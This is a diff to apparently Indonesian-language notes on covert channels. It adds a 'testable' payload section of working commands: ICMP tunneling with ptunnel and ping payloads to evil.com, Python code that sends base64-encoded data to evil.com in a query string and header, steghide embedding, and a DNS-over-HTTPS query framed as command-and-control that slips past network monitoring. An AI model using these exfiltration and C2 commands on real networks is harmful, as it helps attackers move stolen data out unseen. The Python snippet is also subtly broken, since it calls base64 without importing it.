@@ -93,3 +93,64 @@ Evasion: Header = valid format, no anomaly (if crafted well)
 - steghide — https://steghide.sourceforge.net/
 - Covert Channels (book) — https://www.amazon.com/Covert-Channels...
 - CWE-385 (Covert Timing) — https://cwe.mitre.org/data/definitions/385.html
+
+## Konkret — Covert Channel Payload (Testable)
+
+### ICMP Tunneling (ping)
+
+```bash
+# Server (attacker): PINGTUNNEL
+ptunnel                        # listen ICMP
+# Client (target):
+ptunnel -p evil.com -daemon   # connect via ICMP
+
+# Atau manual: exfil via ping payload
+# Setiap ping: data 32 byte di ICMP echo data
+ping -c 1 -s 100 -p $(echo -n "exfil" | xxd -p) evil.com
+# Server: tcpdump 'icmp' → capture payload
+```
+
+### HTTP Steganography (Header/Body)
+
+```python
+# Exfil via HTTP header
+import requests
+data = "exfil_data"
+b64 = base64.b64encode(data.encode()).decode()
+requests.get(f"https://evil.com/api?v={b64}",
+             headers={"X-Token": b64})  # backup kanal
+
+# Body steganography: sisipkan di JSON padding
+{"user": "admin", "padding": "AAAAexfil_data"}
+# Server: parse JSON, baca "padding" field
+```
+
+### LSB Image Steganography
+
+```bash
+# Tool: steghide
+# Embed:
+steghide embed -cf cover.jpg -ef secret.txt -p password
+# Extract:
+steghide extract -sf cover.jpg -p password -xf secret.txt
+
+# zsteg (PNG/BMP auto detect)
+zsteg cover.png
+
+# Contoh exfil: embed ke timestamp watermark
+# Screenshot blog/buy site → upload ke CDN → ekstrak di server
+```
+
+### DNS over HTTPS (DoH) C2
+
+```bash
+# DoH query → bypass DNS monitoring
+# curl ke Google DoH endpoint
+curl -H "accept: application/dns-json" "https://dns.google/resolve?name=evil.com&type=TXT"
+# C2: encode data sebagai TXT query terus ping DoH Google/Cloudflare
+# NIDS lihat HTTPS traffic ke dns.google = legitimate
+```
+---
+
+audited
+---
